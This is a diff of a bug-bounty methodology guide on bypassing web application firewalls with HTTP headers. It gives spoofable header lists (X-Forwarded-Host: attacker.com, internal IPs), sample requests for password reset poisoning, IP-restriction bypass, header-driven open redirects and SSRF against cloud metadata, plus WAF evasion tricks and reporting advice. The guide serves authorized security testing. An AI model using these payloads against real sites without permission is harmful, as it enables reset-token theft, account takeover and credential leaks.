@@ -1,27 +1,23 @@
-# **WAF Bypass Using Headers (Password Reset Poisoning)**
+# WAF Bypass Using Headers (Password Reset Poisoning)
 
-## **Introduction**
-Web Application Firewalls (WAFs) are commonly used to filter and monitor HTTP traffic to protect web applications from attacks. However, attackers can bypass WAFs by **manipulating HTTP headers**. One such attack involves **Password Reset Poisoning**, where an attacker leverages forged headers to manipulate the behavior of the application, particularly in password reset functionalities.
+Web application firewalls filter and monitor HTTP traffic, but many applications and misconfigured reverse proxies *trust* client-supplied headers (`Host`, `X-Forwarded-*`, `Referer`, IP-spoofing headers) to decide a user's origin, IP, or intended destination. Manipulating these lets an attacker slip past WAF rules, redirect password-reset links to their own domain, spoof trusted IPs, or coerce server-side fetches of internal resources. Header-trust bugs here typically escalate to account takeover (reset token theft) or access control bypass.
 
-This document outlines techniques to **bypass WAFs** using custom headers, including examples of how they can be used in **password reset poisoning** and other similar attacks.
+Overlapping routing-header techniques: [Host-Header.md](../Host-Header/Host-Header.md) · 403 trust-header cases: [403Bypass.md](../Status_Code_Bypass/403Bypass.md)
 
----
+## Hunting Checklist
 
-## **How Does WAF Header Manipulation Work?**
-Many web applications rely on **HTTP headers** to determine a user's origin, session, or intended destination. By modifying these headers, an attacker can:
-- Trick the application into believing the request is coming from a trusted source.
-- Redirect password reset links to an attacker's domain.
-- Bypass security measures by manipulating `X-Forwarded-For`, `Referer`, or `Origin` headers.
-- Spoof a legitimate user by injecting headers used for authentication.
+1. Identify header-trust surface: request password reset, account verification, and any link/email-generating flow while injecting one suspect header at a time.
+2. For reset poisoning: replace/via `Host`, `X-Forwarded-Host`, `X-Forwarded`, or `X-Forwarded_Server` with an attacker domain and check the emailed link's host.
+3. For IP-restriction bypass: replay blocked requests with each internal-IP header below (`127.0.0.1` / `::1` / private ranges) — compare against the plain request's 403.
+4. For cache/routing abuse: combine headers with path fuzzing (see Host-Header doc).
+5. Watch for WAF-layer differences: send the same payload with/without the header to see whether the WAF (not the app) blocked it.
+6. Confirm blind-side effects with interaction: register a victim-like address, trigger flows, and observe tokens/redirects arriving at your listener.
 
-Some applications also have misconfigured **reverse proxies**, which trust certain headers to determine the client’s IP address, allowing **internal access** through header manipulation.
+## Test Cases & Examples
 
----
+### Header list commonly used for WAF bypass & server-side manipulation
 
-## **Common Headers Used for WAF Bypass**
-Below are the most commonly used headers for WAF bypass and server-side manipulation:
-
-```
+```http
 X-Forwarded-Host: attacker.com
 X-Forwarded-Port: 443
 X-Forwarded-Scheme: https
@@ -35,7 +31,6 @@ Proxy-Host: 127.0.0.1
 Request-Uri: 127.0.0.1
 X-Forwarded: 127.0.0.1
 X-Forwarded-By: 127.0.0.1
-X-Forwarded-For: 127.0.0.1
 X-Forwarded-For-Original: 127.0.0.1
 X-Forwarded-Host: 127.0.0.1
 X-Forwarded-Server: 127.0.0.1
@@ -63,22 +58,18 @@ X-Remote-Addr: 127.0.0.1
 X-Custom-IP-Authorization: 127.0.0.1
 X-Originating-IP: 127.0.0.1
 X-Remote-IP: 127.0.0.1
-X-Original-Url:
 X-Forwarded-Server:
-X-Host:
-X-Forwarded-Host:
 X-Rewrite-Url:
 ```
 
----
+By modifying these headers an attacker can: trick the app into believing the request comes from a trusted source; redirect password-reset links to an attacker domain; bypass security by manipulating `X-Forwarded-For`, `Referer`, `Origin`; spoof a legitimate user via headers used for authentication. Misconfigured reverse proxies that trust client-IP headers also open **internal access**.
 
-## **Practical Attack Scenario: Password Reset Poisoning**
-### **Step 1: Identifying the Vulnerability**
-- Many web applications send password reset links based on the **Host** or **Origin** headers.
-- If these headers are **not validated properly**, an attacker can **poison** the password reset URL.
+### Password reset poisoning
 
-### **Step 2: Sending a Manipulated Request**
-**Example Request:**
+**Step 1 — identify:** many apps build reset links from `Host` or `Origin`; if those are unvalidated, the reset URL can be poisoned.
+
+**Step 2 — manipulated request:**
+
 ```http
 POST /reset-password HTTP/1.1
 Host: victim-site.com
@@ -90,64 +81,69 @@ Content-Type: application/x-www-form-urlencoded
 email=victim@victim.com
 ```
 
-### **Step 3: Intercepting the Response**
-If the server does not validate the `X-Forwarded-Host` header, it might send a **password reset link to the victim** that looks like this:
+**Step 3 — result:** with no validation of `X-Forwarded-Host`, the email sent to the victim contains:
 
-```
+```text
 https://attacker.com/reset?token=abcdef123456
 ```
 
-Now, when the victim clicks on the reset link, they will be redirected to the attacker's site, where their credentials can be **stolen via phishing**.
+When the victim clicks it, they are redirected to the attacker's site, where credentials can be stolen via phishing — and the reset token itself leaks to the attacker.
 
----
+### Bypassing IP-based restrictions
 
-## **Other Uses of WAF Header Manipulation**
-### **1. Bypassing IP-Based Restrictions**
-- Some web applications **block access** based on the user’s IP address.
-- If the WAF **trusts headers** like `X-Forwarded-For`, an attacker can **spoof their IP** and gain access.
+**Step 1:** some applications block access based on the user's IP; if the WAF trusts `X-Forwarded-For`, an attacker can spoof their IP.
 
-**Example Request:**
 ```http
 GET /admin HTTP/1.1
 Host: target.com
 X-Forwarded-For: 192.168.1.100
 ```
-- If `192.168.1.100` is a **trusted internal IP**, access will be granted.
 
----
+**Step 2:** if `192.168.1.100` is a trusted internal IP, access is granted.
 
-### **2. Exploiting Open Redirects**
-Some applications use `Referer`, `Redirect`, or `X-Forwarded-Host` to construct redirect URLs.
+### Exploiting open redirects via headers
 
-**Example Request:**
+Some applications use `Referer`, `Redirect`, or `X-Forwarded-Host` to construct redirect URLs:
+
 ```http
 GET /login?redirect=https://victim.com HTTP/1.1
 Host: target.com
 X-Forwarded-Host: attacker.com
 ```
-- The victim is redirected to a phishing page **hosted by the attacker**.
 
----
+The victim is then redirected to a phishing page **hosted by the attacker**. (Parameter-side redirect bypasses: [Open_Redirection_Bypass.md](../Open_Redirection/Open_Redirection_Bypass.md).)
 
-### **3. SSRF (Server-Side Request Forgery) Exploitation**
-Some applications **fetch remote resources** based on user input. By modifying headers, an attacker can:
-- Force the application to fetch **internal resources**.
-- Target **AWS metadata services** or other sensitive internal services.
+### SSRF (Server-Side Request Forgery) exploitation
 
-**Example Request:**
+Some applications fetch remote resources based on user input; modified headers can force fetches of internal resources — AWS metadata or other sensitive internal services:
+
 ```http
 GET /api/v1/fetch HTTP/1.1
 Host: target.com
 X-Forwarded-For: 169.254.169.254
 X-Real-IP: 169.254.169.254
 ```
-- If the application fetches the resource using these headers, it could **leak AWS credentials** or **internal system information**.
 
----
+If the application fetches the resource using these headers, it could leak AWS credentials or internal system information. (Full SSRF methodology: [SSRF.md](../SSRF/SSRF.md).)
 
-## **Author**
-- **[Virdoex_hunter](https://twitter.com/Virdoex_hunter)**
-- **[remonsec](https://x.com/remonsec)**
+## Bypass Techniques
 
----
-*Enhanced and reformatted for HowToHunt repository by [remonsec](https://x.com/remonsec)*
+- Send **one** suspect header per request — multiple at once mask which one the backend trusts.
+- If a header name is filtered, use the sibling list above (`X-Forwarder-For`, `X-Forwarded-For-Original`, `X-Http-Host-Override`, `Client-Ip`, `True-Client-Ip`, `X-Azure-Ref`, etc. all appear in real stacks).
+- Case/whitespace/LWS variations (`X-fOrWaRdEd-For:`, tab before the value) defeat case-sensitive and naive-whitespace WAF regexes.
+- Duplicate headers (`X-Forwarded-For: 1.2.3.4` twice) probe first-vs-last-value parsing differences between WAF and origin.
+- IPv6/internal formats (`::1`, `10.0.0.1`, decimal/octal IP encodings) when `127.0.0.1` is specifically filtered.
+- Domain-confusion values (`site.com.attacker.com`) follow the same endsWith logic as [CORS bypasses](../CORS/CORS_Bypasses.md).
+
+## Tools & Resources
+
+- Burp Repeater + match/replace rules for header rotation; Turbo Intruder for large header×value matrices
+- [Host-Header.md](../Host-Header/Host-Header.md) (routing-header tests) · [403Bypass.md](../Status_Code_Bypass/403Bypass.md) (IP trust headers on 403s)
+- References: OWASP [Testing for Host Header](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Tests_for_Logic_Circumvention/) & PortSwigger research on web cache poisoning and host-header attacks
+- Authors: **[Virdoex_hunter](https://twitter.com/Virdoex_hunter)** · **[remonsec](https://x.com/remonsec)**
+
+## Report Tips
+
+- For reset poisoning, the money shot is the **emailed link containing your domain** (screenshot of inbox + token in URL) — state the impact as token theft → account takeover.
+- Include a negative control: the same request without the header produces the normal link/403 — this proves the header, not app logic, is the flaw.
+- If only a 302/redirect to your host occurs (no token), report it as host-header-driven open redirect/phishing with the exact user-visible context; avoid claiming ATO you didn't demonstrate.
